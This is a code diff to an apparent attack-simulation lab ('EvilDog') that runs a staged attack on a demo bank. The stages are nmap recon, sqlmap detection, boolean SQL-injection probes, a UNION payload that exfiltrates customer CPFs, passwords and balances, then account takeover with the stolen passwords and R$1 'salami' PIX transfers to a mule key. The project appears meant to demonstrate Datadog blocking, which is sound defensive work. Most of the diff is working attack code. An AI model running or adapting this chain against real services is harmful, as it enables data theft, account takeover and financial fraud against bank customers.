@@ -33,6 +33,7 @@ import time
 import uuid
 import secrets
 import threading
+import xml.etree.ElementTree as ET
 from contextlib import asynccontextmanager
 from contextvars import ContextVar
 from datetime import datetime, timezone
@@ -508,6 +509,11 @@ API_STATE = {
         "detail": None,
         "started_at": None,
         "finished_at": None,
+        # Evidências públicas por estágio. Os artefatos internos (senhas e
+        # sessões) vivem somente no contexto local da execução e nunca entram
+        # neste snapshot/SSE.
+        "artifacts": {},
+        "transitions": [],
     },
     "agents": {},                  # job_name -> {run_id, branch, phase, ip, created_at} (real escalate)
     "last_escalate_at": 0.0,       # monotonic ts of last /escalate call (cooldown)
@@ -531,6 +537,8 @@ def _pipeline_snapshot() -> dict:
         "detail": p.get("detail"),
         "started_at": p.get("started_at"),
         "finished_at": p.get("finished_at"),
+        "artifacts": dict(p.get("artifacts") or {}),
+        "transitions": list(p.get("transitions") or []),
         "telemetry": {"last_seq": bus.seq, "dropped_events": bus.dropped_events},
     }
 
@@ -554,6 +562,8 @@ def _start_pipeline_state(run_id: str, source_ip: str) -> None:
         "detail": None,
         "started_at": _now(),
         "finished_at": None,
+        "artifacts": {},
+        "transitions": [],
     })
 
 
@@ -588,15 +598,31 @@ def _cards() -> dict:
 # --------------------------------------------------------------------------- #
 # Structured impact wrappers (real calls, parsed results)                     #
 # --------------------------------------------------------------------------- #
-def _run_sqli_exfil() -> dict:
-    """Real UNION exfil against validate-pix-key; returns records_leaked + preview."""
-    url = _svc("/api/transactions/validate-pix-key")
+def _run_sqli_exfil(payload: Optional[dict] = None) -> dict:
+    """Execute the payload produced by PAYLOAD against DETECT's exact target.
+
+    The optional fallback keeps the standalone SQLi action backwards
+    compatible. The orchestrated pipeline always supplies the generated
+    artifact, so endpoint, method and parameter are no longer rediscovered or
+    silently replaced here.
+    """
+    payload = payload or {
+        "url": _svc("/api/transactions/validate-pix-key"),
+        "method": "GET",
+        "parameter": "pixKey",
+        "value": SQLI_EXFIL_PAYLOAD,
+    }
+    url = payload["url"]
     try:
         # _pipe_request (não requests.get cru): é ele que transforma o 403/406 da AAP em
         # BlockedError. Com o get cru, um bloqueio real virava só "0 registros" e o nó
         # INJECT seguia marcado como "success" -- o ataque aparecia como bem-sucedido
         # exatamente quando a Datadog o tinha barrado.
-        r = _pipe_request("GET", url, params={"pixKey": SQLI_EXFIL_PAYLOAD})
+        r = _pipe_request(
+            payload.get("method", "GET"),
+            url,
+            params={payload["parameter"]: payload["value"]},
+        )
         data = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
     except PipelineOutcomeError:
         raise
@@ -615,7 +641,10 @@ def _run_sqli_exfil() -> dict:
                      "message": f"[EXTRACT] SQLi vazou {records} registros de clientes (CPF/saldo/chave PIX)"})
     return {
         "ok": True, "http_status": r.status_code, "records_leaked": records,
-        "leaked_preview": leaked_all[:8], "query": data.get("query_executed"),
+        "leaked_preview": leaked_all[:8], "leaked_records": leaked_all,
+        "query": data.get("query_executed"),
+        "source": {"url": url, "method": payload.get("method", "GET"),
+                   "parameter": payload["parameter"]},
     }
 
 
@@ -889,14 +918,131 @@ BLOCK_SYNC_POLL_S = float(os.getenv("EVILDOG_BLOCK_SYNC_POLL_S", "0.5"))
 _NMAP_HOSTS = os.getenv("EVILDOG_NMAP_HOSTS", "auth-service transaction-service account-service").split()
 _NMAP_PORTS = os.getenv("EVILDOG_NMAP_PORTS", "8088,8084,8089,8091")
 
+# O nmap descobre serviços, não campos HTTP. Esta pequena wordlist é o limite
+# explícito do laboratório: somente rotas do DogBank podem ser enumeradas. Uma
+# entrada só segue para o DETECT quando o host/porta apareceu de fato no nmap e
+# um probe benigno confirmou o endpoint e o parâmetro.
+SQLI_SURFACE_CATALOG = [
+    {
+        "host": "transaction-service",
+        "port": 8084,
+        "method": "GET",
+        "path": "/api/transactions/validate-pix-key",
+        "parameter": "pixKey",
+        "probe_value": DRAIN_KEY,
+        "dbms": "postgresql",
+    },
+]
 
-def _node(node: str, state: str, message: str = "") -> None:
+
+def _node(node: str, state: str, message: str = "", artifact: Optional[dict] = None) -> None:
     API_STATE["last_pipeline"][node] = state
-    bus.publish({"type": "node", "node": node, "state": state,
-                 "run_id": _RUN_ID.get() or API_STATE["pipeline"].get("run_id"),
-                 "source_ip": _RUN_SOURCE_IP.get() or API_STATE["pipeline"].get("source_ip"),
-                 "level": "success" if state == "success" else ("critical" if state == "fail" else "info"),
-                 "message": message or f"{node}: {state}"})
+    if artifact is not None:
+        API_STATE["pipeline"].setdefault("artifacts", {})[node] = artifact
+    event = {"type": "node", "node": node, "state": state,
+             "run_id": _RUN_ID.get() or API_STATE["pipeline"].get("run_id"),
+             "source_ip": _RUN_SOURCE_IP.get() or API_STATE["pipeline"].get("source_ip"),
+             "level": "success" if state == "success" else ("critical" if state == "fail" else "info"),
+             "message": message or f"{node}: {state}"}
+    if artifact is not None:
+        event["artifact"] = artifact
+    bus.publish(event)
+
+
+def _complete_stage(context: dict, producer: str, consumer: Optional[str], internal: dict,
+                    public: dict, message: str) -> None:
+    """Commit one stage output and explicitly hand it to the next stage.
+
+    `internal` may contain lab credentials and therefore stays only in the
+    in-memory context owned by this run. `public` is the redacted evidence that
+    may safely be exposed in `/pipeline/state` and SSE.
+    """
+    context[producer] = internal
+    _node(producer, "success", message, artifact=public)
+    if not consumer:
+        return
+    transition = {
+        "from": producer,
+        "to": consumer,
+        "keys": sorted(public.keys()),
+        "summary": public.get("summary", ""),
+    }
+    API_STATE["pipeline"].setdefault("transitions", []).append(transition)
+    bus.publish({
+        "type": "handoff",
+        "node": producer,
+        "run_id": _RUN_ID.get() or API_STATE["pipeline"].get("run_id"),
+        "source_ip": _RUN_SOURCE_IP.get() or API_STATE["pipeline"].get("source_ip"),
+        "level": "info",
+        "message": f"[HANDOFF] {producer} → {consumer}: {public.get('summary', 'evidência entregue')}",
+        "from": producer,
+        "to": consumer,
+        "artifact": public,
+    })
+
+
+def _require_stage_artifact(context: dict, producer: str, *keys: str) -> dict:
+    artifact = context.get(producer)
+    if not isinstance(artifact, dict):
+        raise BackendError(f"{producer} não entregou artefato para o próximo estágio")
+    missing = [key for key in keys if not artifact.get(key)]
+    if missing:
+        raise BackendError(f"artefato de {producer} incompleto: faltando {', '.join(missing)}")
+    return artifact
+
+
+def _parse_nmap_discovery(xml_output: str) -> List[dict]:
+    """Parse the real nmap XML instead of treating process exit as discovery."""
+    try:
+        root = ET.fromstring(xml_output)
+    except ET.ParseError as exc:
+        raise BackendError(f"nmap discovery retornou XML inválido: {exc}") from exc
+    hosts = []
+    for host_el in root.findall("host"):
+        status = host_el.find("status")
+        if status is None or status.get("state") != "up":
+            continue
+        address_el = host_el.find("address[@addrtype='ipv4']")
+        if address_el is None:
+            address_el = host_el.find("address")
+        hostname_el = host_el.find("./hostnames/hostname")
+        address = address_el.get("addr") if address_el is not None else ""
+        hostname = hostname_el.get("name") if hostname_el is not None else address
+        if address:
+            hosts.append({"host": hostname or address, "address": address, "status": "up"})
+    return hosts
+
+
+def _parse_nmap_services(xml_output: str, discovered_hosts: List[dict]) -> List[dict]:
+    """Return only ports that nmap actually reported open."""
+    try:
+        root = ET.fromstring(xml_output)
+    except ET.ParseError as exc:
+        raise BackendError(f"nmap service scan retornou XML inválido: {exc}") from exc
+    names_by_address = {item.get("address"): item.get("host") for item in discovered_hosts}
+    services = []
+    for host_el in root.findall("host"):
+        address_el = host_el.find("address[@addrtype='ipv4']")
+        if address_el is None:
+            address_el = host_el.find("address")
+        hostname_el = host_el.find("./hostnames/hostname")
+        address = address_el.get("addr") if address_el is not None else ""
+        hostname = (hostname_el.get("name") if hostname_el is not None else None) or names_by_address.get(address) or address
+        for port_el in host_el.findall("./ports/port"):
+            state_el = port_el.find("state")
+            if state_el is None or state_el.get("state") != "open":
+                continue
+            service_el = port_el.find("service")
+            services.append({
+                "host": hostname,
+                "address": address,
+                "port": int(port_el.get("portid", "0")),
+                "protocol": port_el.get("protocol", "tcp"),
+                "service": service_el.get("name", "unknown") if service_el is not None else "unknown",
+                "product": service_el.get("product", "") if service_el is not None else "",
+                "version": service_el.get("version", "") if service_el is not None else "",
+            })
+    return services
 
 
 class PipelineOutcomeError(Exception):
@@ -1033,6 +1179,89 @@ def _pipe_request(method: str, url: str, xff: str = None, **kw):
     if classification:
         raise classification
     return resp
+
+
+def _enumerate_sqli_surfaces(services: List[dict]) -> List[dict]:
+    """Turn nmap HTTP services into verified, lab-scoped parameter candidates."""
+    candidates = []
+    for service in services:
+        for catalog in SQLI_SURFACE_CATALOG:
+            if service.get("host") != catalog["host"] or service.get("port") != catalog["port"]:
+                continue
+            url = f"http://{service['host']}:{service['port']}{catalog['path']}"
+            response = _pipe_request(
+                catalog["method"],
+                url,
+                params={catalog["parameter"]: catalog["probe_value"]},
+                timeout=8,
+            )
+            if response.status_code != 200:
+                continue
+            candidates.append({
+                "host": service["host"],
+                "address": service.get("address"),
+                "port": service["port"],
+                "service": service.get("service", "http"),
+                "method": catalog["method"],
+                "url": url,
+                "path": catalog["path"],
+                "parameter": catalog["parameter"],
+                "dbms": catalog["dbms"],
+                "probe_status": response.status_code,
+            })
+    return candidates
+
+
+def _probe_sqli_differential(candidate: dict) -> dict:
+    """Confirm input-to-query influence without reusing the exfil payload.
+
+    A true and a false predicate are sent to the parameter discovered by SCAN.
+    The response difference is retained as evidence for DETECT; credentials are
+    not requested until INJECT.
+    """
+    true_value = f"{DRAIN_KEY}' OR '1'='1'--"
+    false_value = f"{DRAIN_KEY}' AND '1'='2'--"
+    true_response = _pipe_request(
+        candidate["method"], candidate["url"],
+        params={candidate["parameter"]: true_value}, timeout=8,
+    )
+    false_response = _pipe_request(
+        candidate["method"], candidate["url"],
+        params={candidate["parameter"]: false_value}, timeout=8,
+    )
+    try:
+        true_body = true_response.json()
+    except (TypeError, ValueError):
+        true_body = {}
+    true_records = int(true_body.get("records_leaked", 0) or 0)
+    confirmed = (
+        true_response.status_code == 200
+        and true_records > 1
+        and false_response.status_code != true_response.status_code
+    )
+    return {
+        "confirmed": confirmed,
+        "true_status": true_response.status_code,
+        "false_status": false_response.status_code,
+        "true_records": true_records,
+        "technique": "boolean-differential",
+    }
+
+
+def _build_sqli_payload(finding: dict) -> dict:
+    if not finding.get("vulnerable"):
+        raise BackendError("PAYLOAD recebeu um finding sem vulnerabilidade confirmada")
+    for key in ("url", "method", "parameter"):
+        if not finding.get(key):
+            raise BackendError(f"finding do DETECT sem {key}")
+    return {
+        "url": finding["url"],
+        "method": finding["method"],
+        "parameter": finding["parameter"],
+        "value": SQLI_EXFIL_PAYLOAD,
+        "technique": "UNION",
+        "columns": ["nome", "email", "cpf:senha:mfa", "saldo", "banco", "chave_pix"],
+    }
 
 
 def _source_ip_is_available(source_ip: str) -> bool:
@@ -1197,71 +1426,112 @@ def _dwell(since: float) -> None:
         time.sleep(remaining)
 
 
-def _ato_transfer(amount: float = 1.0) -> dict:
-    """Fecha a cadeia com a credencial ROUBADA. MFA muda o jogo: o ATO por senha direta
-    SÓ funciona em contas SEM MFA — as com MFA resistem (não é tão fácil assim). Depois,
-    TRANSFER faz salami: desvia R$1 de CADA conta sem MFA (abaixo do radar)."""
-    # Exclui a própria conta-laranja (mule) dos alvos — o atacante não drena o próprio destino.
-    creds = [r for r in API_STATE["loot_records"]
-             if r.get("senha") and r.get("cpf") and r.get("chave_pix") != DRAIN_KEY]
+def _run_ato(credentials: List[dict]) -> dict:
+    """Consume only credentials produced by this run's INJECT stage."""
+    creds = [row for row in credentials
+             if row.get("senha") and row.get("cpf") and row.get("chave_pix") != DRAIN_KEY]
     if not creds:
-        raise RuntimeError("nenhuma credencial exfiltrada disponível (rode o SQLi antes)")
-    non_mfa = [r for r in creds if not r.get("mfa")]
-    mfa_on = [r for r in creds if r.get("mfa")]
-
-    # 1) ATO — só contas SEM MFA caem no ataque de senha direta
-    st = _stage("ATO", "ATO")
+        raise RuntimeError("INJECT não entregou credenciais utilizáveis ao ATO")
+    non_mfa = [row for row in creds if not row.get("mfa")]
+    mfa_on = [row for row in creds if row.get("mfa")]
     if mfa_on:
         bus.publish({"level": "warn", "node": "ATO",
-                     "message": f"[ATO] {len(mfa_on)} conta(s) COM MFA resistiram ao ataque de senha direta — puladas"})
+                     "message": f"[ATO] {len(mfa_on)} conta(s) COM MFA resistiram — não foram encaminhadas"})
     if not non_mfa:
-        _dwell(st)
-        _node("ATO", "fail", "[ATO] todas as contas exfiltradas têm MFA — ATO por senha bloqueado 🔒")
-        raise RuntimeError("todas as contas exfiltradas têm MFA")
-    v0 = random.choice(non_mfa)
-    bus.publish({"level": "warn", "node": "ATO",
-                 "message": f"[ATO] login como {v0.get('nome','vítima')} (CPF {v0['cpf'][:3]}***) — SEM MFA, a senha roubada basta"})
-    lr = _pipe_request("POST", _svc("/api/auth/login"), json={"cpf": v0["cpf"], "senha": v0["senha"]})
-    if lr.status_code not in (200, 201, 429):
-        _node("ATO", "fail", f"[ATO] login recusado (HTTP {lr.status_code})")
-        raise RuntimeError(f"ATO falhou (HTTP {lr.status_code})")
-    _dwell(st)
-    _node("ATO", "success", f"[ATO] {len(non_mfa)} conta(s) SEM MFA comprometida(s) com senha roubada ✅")
-    API_STATE["compromised"].add("auth-service")
+        raise RuntimeError("todas as credenciais entregues pelo INJECT têm MFA")
 
-    # 2) TRANSFER — salami: R$1 de CADA conta sem MFA (fica abaixo do radar)
-    st = _stage("TRANSFER", "TRANSFER")
+    sessions = []
+    for credential in non_mfa:
+        bus.publish({"level": "warn", "node": "ATO",
+                     "message": f"[ATO] testando credencial recebida: CPF {credential['cpf'][:3]}***"})
+        response = _pipe_request(
+            "POST", _svc("/api/auth/login"),
+            json={"cpf": credential["cpf"], "senha": credential["senha"]},
+        )
+        if response.status_code not in (200, 201):
+            bus.publish({"level": "warn", "node": "ATO",
+                         "message": f"[ATO] credencial recusada (HTTP {response.status_code})"})
+            continue
+        try:
+            login = response.json()
+        except (TypeError, ValueError):
+            login = {}
+        account_id = login.get("accountId") or login.get("account_id")
+        if not account_id:
+            bus.publish({"level": "warn", "node": "ATO",
+                         "message": "[ATO] login aceito, mas auth-service não retornou accountId"})
+            continue
+        sessions.append({
+            "account_id": account_id,
+            "cpf": credential["cpf"],
+            "password": credential["senha"],
+            "name": login.get("nome") or credential.get("nome") or "vítima",
+        })
+    if not sessions:
+        raise RuntimeError("ATO não produziu nenhuma sessão autenticada")
+    API_STATE["compromised"].add("auth-service")
+    return {
+        "sessions": sessions,
+        "credentials_received": len(creds),
+        "mfa_protected": len(mfa_on),
+    }
+
+
+def _run_transfer(sessions: List[dict], amount: float = 1.0) -> dict:
+    """Consume account ids and passwords proven by ATO; no global loot lookup."""
+    if not sessions:
+        raise RuntimeError("ATO não entregou sessões ao TRANSFER")
     to = DRAIN_KEY
     bus.publish({"level": "critical", "node": "TRANSFER",
-                 "message": f"[TRANSFER] salami: desviando R$ {amount:.2f} de {len(non_mfa)} conta(s) sem MFA → {to} (abaixo do radar)"})
+                 "message": f"[TRANSFER] recebidas {len(sessions)} sessão(ões); salami de R$ {amount:.2f} → {to}"})
     hits, total = 0, 0.0
-    for v in non_mfa:
+    for session in sessions:
         try:
-            ur = _pipe_request("GET", f"{AUTH_SERVICE_URL}/api/users/cpf/{v['cpf']}")
-            acc = ur.json().get("id")
-            rp = _pipe_request("POST", _svc("/api/transactions/pix"),
-                               json={"accountOriginId": acc, "pixKeyDestination": to, "amount": amount,
-                                     "password": v["senha"], "description": "ajuste tarifa"},
-                               headers={**dict(attacker.session.headers),
-                                        "X-Idempotency-Key": f"evildog-ato-{uuid.uuid4().hex[:10]}"}, timeout=25)
-            if rp.status_code in (200, 201):
+            response = _pipe_request(
+                "POST", _svc("/api/transactions/pix"),
+                json={
+                    "accountOriginId": session["account_id"],
+                    "pixKeyDestination": to,
+                    "amount": amount,
+                    "password": session["password"],
+                    "description": "ajuste tarifa",
+                },
+                headers={**dict(attacker.session.headers),
+                         "X-Idempotency-Key": f"evildog-ato-{uuid.uuid4().hex[:10]}"},
+                timeout=25,
+            )
+            if response.status_code in (200, 201):
                 hits += 1
                 total += amount
                 bus.publish({"level": "success", "node": "TRANSFER",
-                             "message": f"[TRANSFER] R$ {amount:.2f} de {v.get('nome','?')} → {to}"})
+                             "message": f"[TRANSFER] R$ {amount:.2f} de {session['name']} → {to}"})
+            else:
+                bus.publish({"level": "warn", "node": "TRANSFER",
+                             "message": f"[TRANSFER] {session['name']}: HTTP {response.status_code}"})
         except PipelineOutcomeError:
             raise
         except Exception as exc:
-            bus.publish({"level": "warn", "node": "TRANSFER", "message": f"[TRANSFER] {v.get('nome','?')}: {exc}"})
+            bus.publish({"level": "warn", "node": "TRANSFER",
+                         "message": f"[TRANSFER] {session.get('name', '?')}: {exc}"})
         time.sleep(0.1)
-    if hits:
-        API_STATE["pix_stolen"].append({"amount": total, "to": to, "from_account": f"{hits} contas"})
-        API_STATE["compromised"].add("transaction-service")
-    _dwell(st)
-    _node("TRANSFER", "success" if hits else "fail",
-          f"[TRANSFER] salami: R$ {total:.2f} de {hits}/{len(non_mfa)} conta(s) sem MFA → {to}")
-    return {"ok": hits > 0, "accounts": len(non_mfa), "mfa_protected": len(mfa_on),
-            "drained_ok": hits, "total": total, "to": to}
+    if not hits:
+        raise RuntimeError("TRANSFER recebeu sessões, mas nenhum PIX foi aceito")
+    API_STATE["pix_stolen"].append({"amount": total, "to": to, "from_account": f"{hits} contas"})
+    API_STATE["compromised"].add("transaction-service")
+    return {"ok": True, "accounts": len(sessions), "drained_ok": hits, "total": total, "to": to}
+
+
+def _ato_transfer(amount: float = 1.0) -> dict:
+    """Compatibility wrapper for individual/legacy actions."""
+    ato_started = _stage("ATO", "ATO")
+    ato = _run_ato(list(API_STATE["loot_records"]))
+    _dwell(ato_started)
+    _node("ATO", "success", f"[ATO] {len(ato['sessions'])} sessão(ões) autenticada(s)")
+    transfer_started = _stage("TRANSFER", "TRANSFER")
+    result = _run_transfer(ato["sessions"], amount=amount)
+    _dwell(transfer_started)
+    _node("TRANSFER", "success", f"[TRANSFER] R$ {result['total']:.2f} desviado(s)")
+    return {**result, "mfa_protected": ato["mfa_protected"]}
 
 
 def _run_pipeline(run_id: str, source_ip: Optional[str] = None,
@@ -1278,8 +1548,9 @@ def _run_pipeline(run_id: str, source_ip: Optional[str] = None,
         _start_pipeline_state(run_id, src)
     bus.publish({"type": "pipeline", "state": "running", "run_id": run_id,
                  "source_ip": src, "outcome": None})
+    context: Dict[str, dict] = {}
     try:
-        # RECON — origem do ataque + nmap discovery + probe HTTP (é aqui que um IP bloqueado bate em 403)
+        # RECON produces the concrete hosts consumed by SCAN.
         st = _stage("RECON", "RECON")
         bus.publish({"level": "warn", "node": "RECON",
                      "message": f"[RECON] origem do ataque: {src} — bloqueie ESTE IP na Datadog (AAP) para interromper"})
@@ -1287,84 +1558,220 @@ def _run_pipeline(run_id: str, source_ip: Optional[str] = None,
             bus.publish({"level": "info", "node": "RECON",
                          "message": f"[AAP] validando a política de proteção para o IP {src}"})
             _await_aap_enforcement(src)
-        recon_rc, _ = _run_tool(["nmap", "--unprivileged", "-sn", "-n"] + _NMAP_HOSTS,
-                                "RECON", "nmap", timeout=8, max_lines=6)
+        recon_rc, recon_xml = _run_tool(
+            ["nmap", "--unprivileged", "-sn", "-n", "-oX", "-"] + _NMAP_HOSTS,
+            "RECON", "nmap", timeout=8, max_lines=0,
+        )
         if recon_rc != 0:
             raise BackendError(f"nmap discovery falhou (exit code {recon_rc})")
-        # Probe pelo MESMO caminho (ingress → transaction-service) que os estágios de exploração
-        # usam. Assim, se a AAP bloqueou o IP do atacante, o 403 é detectado JÁ no recon (e não
-        # só na transferência). Sondamos os dois serviços protegíveis via ingress.
+        discovered_hosts = _parse_nmap_discovery(recon_xml)
+        if not discovered_hosts:
+            raise BackendError("nmap terminou sem descobrir hosts ativos")
+
+        # Probe only services that RECON actually discovered. This retains the
+        # early AAP enforcement check without pre-deciding the rest of the flow.
+        discovered_names = {item["host"] for item in discovered_hosts}
         encoded_receiver = requests.utils.quote(DRAIN_KEY, safe="")
-        for probe in (
-            _svc("/api/transactions/validate-pix-key") + f"?pixKey={encoded_receiver}",
-            _svc("/api/auth/pix-key/") + encoded_receiver,
-        ):
+        probes = []
+        if "transaction-service" in discovered_names:
+            probes.append(_svc("/api/transactions/validate-pix-key") + f"?pixKey={encoded_receiver}")
+        if "auth-service" in discovered_names:
+            probes.append(_svc("/api/auth/pix-key/") + encoded_receiver)
+        for probe in probes:
             response = _pipe_request("GET", probe, timeout=8)
             if response.status_code != 200:
                 raise BackendError(
                     f"RECON esperava HTTP 200, recebeu HTTP {response.status_code} em {response.url}"
                 )
         _dwell(st)
-        _node("RECON", "success", f"[RECON] alvo mapeado ({TARGET_LABEL}) · origem {src}")
+        recon_public = {
+            "summary": f"{len(discovered_hosts)} hosts ativos descobertos",
+            "hosts": discovered_hosts,
+        }
+        _complete_stage(
+            context, "RECON", "SCAN", {"hosts": discovered_hosts}, recon_public,
+            f"[RECON] {len(discovered_hosts)} host(s) ativos mapeados · origem {src}",
+        )
 
-        # SCAN — nmap service/version scan REAL
+        # SCAN consumes RECON hosts, parses real open services, then verifies
+        # parameterized HTTP surfaces from the lab-scoped wordlist.
         st = _stage("SCAN", "SCAN")
-        scan_rc, _ = _run_tool(
-            ["nmap", "--unprivileged", "-sT", "-sV", "-Pn", "-n", "-T4", "-p", _NMAP_PORTS] + _NMAP_HOSTS,
-            "SCAN", "nmap", timeout=13, max_lines=8,
+        recon_artifact = _require_stage_artifact(context, "RECON", "hosts")
+        scan_targets = [item["host"] for item in recon_artifact["hosts"]]
+        scan_rc, scan_xml = _run_tool(
+            ["nmap", "--unprivileged", "-sT", "-sV", "-Pn", "-n", "-T4",
+             "-p", _NMAP_PORTS, "-oX", "-"] + scan_targets,
+            "SCAN", "nmap", timeout=16, max_lines=0,
         )
         if scan_rc != 0:
             raise BackendError(f"nmap service scan falhou (exit code {scan_rc})")
+        services = _parse_nmap_services(scan_xml, recon_artifact["hosts"])
+        if not services:
+            raise BackendError("SCAN não encontrou nenhuma porta aberta nos hosts do RECON")
+        candidates = _enumerate_sqli_surfaces(services)
+        ports = sorted({item["port"] for item in services})
         _dwell(st)
-        _node("SCAN", "success", f"[SCAN] portas expostas: {_NMAP_PORTS}")
+        scan_public = {
+            "summary": (f"portas {', '.join(map(str, ports))}; "
+                        f"{len(candidates)} entrada(s) HTTP parametrizada(s)"),
+            "services": services,
+            "candidates": [{key: value for key, value in candidate.items()
+                            if key != "probe_value"} for candidate in candidates],
+        }
+        _complete_stage(
+            context, "SCAN", "DETECT",
+            {"services": services, "candidates": candidates}, scan_public,
+            f"[SCAN] {len(services)} serviço(s) aberto(s); {len(candidates)} campo(s) candidato(s)",
+        )
 
-        # DETECT — sqlmap REAL confirma a injeção (+ UNION exfil confirma e popula o loot)
+        # DETECT consumes the exact endpoint/parameter found by SCAN. It runs
+        # sqlmap and a deterministic true/false response proof, but does not
+        # request credentials; that belongs exclusively to INJECT.
         st = _stage("DETECT", "DETECT")
-        sqli_url = _svc("/api/transactions/validate-pix-key") + "?pixKey=1"
-        _, out = _run_tool(["sqlmap", "-u", sqli_url, "-p", "pixKey", "--batch", "--technique=U",
-                            "--level=1", "--risk=1", "--dbms=postgresql", "--flush-session",
+        scan_artifact = _require_stage_artifact(context, "SCAN", "services")
+        if not scan_artifact.get("candidates"):
+            _dwell(st)
+            _node("DETECT", "fail", "[DETECT] SCAN não entregou endpoint parametrizado")
+            _node("REPORT", "success", "[REPORT] nenhum exploit executado (SKIP)")
+            detail = "nenhum endpoint parametrizado foi descoberto"
+            _finish_pipeline_state("done", "NO_EXPLOIT", detail)
+            bus.publish({"type": "pipeline", "state": "done", "run_id": run_id,
+                         "source_ip": src, "outcome": "NO_EXPLOIT", "message": detail})
+            return "done"
+        candidate = scan_artifact["candidates"][0]
+        sqlmap_url = f"{candidate['url']}?{candidate['parameter']}=1"
+        sqlmap_rc, out = _run_tool(
+            ["sqlmap", "-u", sqlmap_url, "-p", candidate["parameter"], "--batch", "--technique=U",
+                            "--level=1", "--risk=1", f"--dbms={candidate['dbms']}", "--flush-session",
                             "--timeout=3", "--retries=1", "--disable-coloring",
                             "-H", f"X-Forwarded-For: {src}"],
-                           "DETECT", "sqlmap", timeout=14, max_lines=10)
-        sqli = _run_sqli_exfil()
-        vulnerable = bool(sqli.get("records_leaked")) or "injectable" in out.lower() or "vulnerable" in out.lower()
+            "DETECT", "sqlmap", timeout=16, max_lines=10,
+        )
+        differential = _probe_sqli_differential(candidate)
+        sqlmap_signal = "injectable" in out.lower() or "vulnerable" in out.lower()
+        vulnerable = differential["confirmed"] or sqlmap_signal
+        finding = {
+            **candidate,
+            "vulnerable": vulnerable,
+            "tool": "sqlmap",
+            "sqlmap_exit_code": sqlmap_rc,
+            "sqlmap_signal": sqlmap_signal,
+            "evidence": differential,
+        }
         _dwell(st)
-        _node("DETECT", "success" if vulnerable else "fail",
-              "[DETECT] SQL Injection confirmada (sqlmap + UNION)" if vulnerable else "[DETECT] alvo aparentemente seguro")
         if not vulnerable:
+            _node("DETECT", "fail", "[DETECT] parâmetro testado sem evidência de SQL Injection",
+                  artifact={"summary": f"{candidate['parameter']} sem evidência", "finding": finding})
             _node("REPORT", "success", "[REPORT] nenhum exploit executado (SKIP)")
             detail = "nenhum exploit executado"
             _finish_pipeline_state("done", "NO_EXPLOIT", detail)
             bus.publish({"type": "pipeline", "state": "done", "run_id": run_id,
                          "source_ip": src, "outcome": "NO_EXPLOIT", "message": detail})
             return "done"
+        detect_public = {
+            "summary": f"{candidate['parameter']} injetável em {candidate['path']}",
+            "finding": finding,
+        }
+        _complete_stage(
+            context, "DETECT", "PAYLOAD", {"finding": finding}, detect_public,
+            f"[DETECT] SQL Injection confirmada em {candidate['method']} "
+            f"{candidate['path']} · parâmetro {candidate['parameter']}",
+        )
 
-        # PAYLOAD — monta o UNION SELECT que exfiltra as credenciais
+        # PAYLOAD consumes DETECT's finding and preserves its target contract.
         st = _stage("PAYLOAD", "PAYLOAD")
-        bus.publish({"level": "info", "node": "PAYLOAD", "message": f"[PAYLOAD] {SQLI_EXFIL_PAYLOAD[:90]}…"})
+        detect_artifact = _require_stage_artifact(context, "DETECT", "finding")
+        payload = _build_sqli_payload(detect_artifact["finding"])
+        bus.publish({"level": "info", "node": "PAYLOAD",
+                     "message": f"[PAYLOAD] {payload['method']} {payload['url']} · "
+                                f"{payload['parameter']}={payload['value'][:70]}…"})
         _dwell(st)
-        _node("PAYLOAD", "success", "[PAYLOAD] UNION SELECT nome,email,cpf:senha,saldo,banco,chave")
+        payload_public = {
+            "summary": f"UNION para {payload['parameter']} · {len(payload['columns'])} colunas",
+            "target": {"url": payload["url"], "method": payload["method"],
+                       "parameter": payload["parameter"]},
+            "technique": payload["technique"],
+            "columns": payload["columns"],
+            "preview": payload["value"][:120],
+        }
+        _complete_stage(
+            context, "PAYLOAD", "INJECT", {"payload": payload}, payload_public,
+            "[PAYLOAD] UNION SELECT montado a partir do finding do DETECT",
+        )
 
-        # INJECT — SQLi UNION real: exfiltra registros COM SENHA
+        # INJECT executes only the payload received from PAYLOAD and hands the
+        # credentials from this response (not accumulated loot) to ATO.
         st = _stage("INJECT", "INJECT")
+        payload_artifact = _require_stage_artifact(context, "PAYLOAD", "payload")
+        sqli = _run_sqli_exfil(payload_artifact["payload"])
         attacker.stats["total_attacks"] += 1
         records = sqli.get("records_leaked", 0)
-        pw_count = sum(1 for r in API_STATE["loot_records"] if r.get("senha"))
+        credentials = sqli.get("leaked_records") or []
+        pw_count = sum(1 for row in credentials if row.get("senha"))
         _dwell(st)
         if not records:
-            # pw_count vem do loot ACUMULADO de execuções anteriores: sem este guard o nó
-            # exibia "N SENHAS exfiltradas" de loot velho numa injeção que não vazou nada.
             _node("INJECT", "fail", f"[INJECT] injeção não retornou registros "
                                     f"(HTTP {sqli.get('http_status')}) — nada exfiltrado nesta execução")
             raise RuntimeError(f"SQLi sem registros (HTTP {sqli.get('http_status')})")
-        _node("INJECT", "success", f"[INJECT] {records} registros + {pw_count} SENHAS reais exfiltradas")
+        inject_public = {
+            "summary": f"{records} registros; {pw_count} credenciais entregues",
+            "records_leaked": records,
+            "credentials_found": pw_count,
+            "fields": ["nome", "email", "cpf", "senha", "mfa", "saldo", "banco", "chave_pix"],
+            "source": sqli.get("source"),
+        }
+        _complete_stage(
+            context, "INJECT", "ATO", {"credentials": credentials}, inject_public,
+            f"[INJECT] {records} registros + {pw_count} credenciais exfiltradas nesta execução",
+        )
 
-        # ATO + TRANSFER — credencial ROUBADA em contas SEM MFA + salami R$1/conta
-        res = _ato_transfer(amount=1.0)
+        # ATO authenticates only the credentials handed over by INJECT.
+        st = _stage("ATO", "ATO")
+        inject_artifact = _require_stage_artifact(context, "INJECT", "credentials")
+        ato = _run_ato(inject_artifact["credentials"])
+        _dwell(st)
+        ato_public = {
+            "summary": f"{len(ato['sessions'])} sessões autenticadas; {ato['mfa_protected']} protegidas por MFA",
+            "credentials_received": ato["credentials_received"],
+            "authenticated_sessions": len(ato["sessions"]),
+            "mfa_protected": ato["mfa_protected"],
+            "account_ids": [session["account_id"] for session in ato["sessions"]],
+        }
+        _complete_stage(
+            context, "ATO", "TRANSFER", {"sessions": ato["sessions"],
+                                           "mfa_protected": ato["mfa_protected"]}, ato_public,
+            f"[ATO] {len(ato['sessions'])} sessão(ões) criada(s) com credenciais do INJECT",
+        )
 
-        _node("REPORT", "success",
-              f"[REPORT] cadeia: SQLi → credenciais → ATO (sem MFA) → salami R$ {res['total']:.2f} "
-              f"de {res['drained_ok']} conta(s) · {res['mfa_protected']} com MFA resistiram")
